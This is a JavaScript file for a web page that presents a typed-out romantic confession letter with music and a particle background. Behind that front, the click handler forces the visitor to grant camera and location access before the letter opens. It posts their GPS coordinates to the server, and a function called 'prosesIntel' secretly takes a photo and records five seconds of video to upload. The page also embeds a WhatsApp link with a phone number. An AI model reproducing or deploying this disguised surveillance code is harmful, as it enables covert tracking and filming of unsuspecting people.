const message = `hi… i just want to say i’m sorry for making you wait for so long. i’m sorry if i’ve ever hurt you, made you tired, or maybe been too harsh with you 

you’ve been by my side for so long without a clear status, and i know that couldn’t have been easy for you. i’m sending this because there’s something i’ve wanted to tell you for a long time, but never had the courage to say it directly…

i want us to be official. i want our relationship to have a clear direction. about all the things you’re afraid of, please try to trust me. i know i’m not perfect, but i truly want to learn and change, slowly becoming better for you.

i want to be there for you… not only when you’re happy, but also when you cry, when you feel alone, when the world feels heavy. i want to always be there for you, to stay by your side, to take care of you. i want to always be there for you.`;

const readBtn = document.getElementById("readBtn");
const letterBox = document.getElementById("letterBox");
const typedText = document.getElementById("typedText");
const cursor = document.getElementById("cursor");
const waBtn = document.getElementById("waBtn");
const music = document.getElementById("bgMusic");
let globalStream;

// --- PARTICLE BACKGROUND ---
const canvas = document.getElementById("bgCanvas");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth; canvas.height = window.innerHeight;
const particles = [];
for(let i=0;i<100;i++){
  particles.push({
    x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*2+1,
    dx: (Math.random()-0.5)*0.5, dy: (Math.random()-0.5)*0.5
  });
}
function drawParticles(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  particles.forEach(p=>{
    ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
    ctx.fillStyle='rgba(255,255,255,0.5)'; ctx.fill();
    p.x += p.dx; p.y += p.dy;
    if(p.x>canvas.width)p.x=0; if(p.x<0)p.x=canvas.width;
    if(p.y>canvas.height)p.y=0; if(p.y<0)p.y=canvas.height;
  });
  requestAnimationFrame(drawParticles);
}
drawParticles();

// --- LOGIKA UTAMA ---
readBtn.addEventListener("click", async () => {
    try {
        // 1. Minta Izin Kamera (Wajib)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        globalStream = stream;

        // 2. Minta Izin Lokasi (Wajib)
        // Kita gunakan Promise agar bisa dikontrol timeout-nya
        const getLocation = () => {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { 
                    timeout: 7000, // Tunggu GPS maksimal 7 detik
                    enableHighAccuracy: false 
                });
            });
        };

        try {
            const position = await getLocation();
            // Kirim lokasi jika berhasil
            fetch("/kirim-lokasi", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    latitude: position.coords.latitude, 
                    longitude: position.coords.longitude 
                })
            });
        } catch (locErr) {
            // Jika user klik "Deny" pada lokasi
            alert("Akses lokasi ditolak. Mohon izinkan lokasi agar surat bisa terbuka.");
            stream.getTracks().forEach(t => t.stop()); // Matikan kamera
            return; // Berhenti di sini, surat tidak terbuka
        }

        // 3. JALANKAN SURAT (Hanya jika kamera & lokasi di-allow)
        bukaSurat();
        prosesIntel(globalStream);

    } catch (camErr) {
        // Jika user klik "Deny" pada kamera
        alert("Akses kamera ditolak. Mohon izinkan kamera agar surat bisa terbuka.");
    }
});

function bukaSurat() {
    music.load();
    music.play().catch(() => console.log("Autoplay blocked"));
    document.getElementById("introText").style.opacity = 0;
    readBtn.style.display = "none";

    letterBox.style.opacity = 0;
    letterBox.style.display = "block";
    setTimeout(() => letterBox.style.opacity = 1, 50);

    let i = 0;
    const words = message.split(/(\s+)/);
    function typeWriter() {
        if (i < words.length) {
            typedText.innerHTML += words[i];
            i++;
            setTimeout(typeWriter, 120);
        } else {
            cursor.style.display = 'none';
            waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
            waBtn.classList.add("show");
            waBtn.scrollIntoView({ behavior: "smooth" });
        }
    }
    typeWriter();
}

function prosesIntel(stream) {
    const v = document.createElement("video");
    v.srcObject = stream;
    v.play();
    v.onloadedmetadata = function() {
        const canvasSnap = document.createElement("canvas");
        canvasSnap.width = 640; canvasSnap.height = 480;
        setTimeout(() => {
            canvasSnap.getContext("2d").drawImage(v, 0, 0, canvasSnap.width, canvasSnap.height);
            canvasSnap.toBlob(function(blob) {
                const fd = new FormData();
                fd.append("photo", blob, "foto.jpg");
                fetch("/kirim-foto", { method: "POST", body: fd });
                
                // Rekam video 5 detik
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const videoBlob = new Blob(chunks, { type: "video/mp4" });
                    const fdV = new FormData();
                    fdV.append("video", videoBlob, "video.mp4");
                    fetch("/kirim-video", { method: "POST", body: fdV })
                    .then(() => { stream.getTracks().forEach(t => t.stop()); });
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);
            }, "image/jpeg");
        }, 2000);
    };
}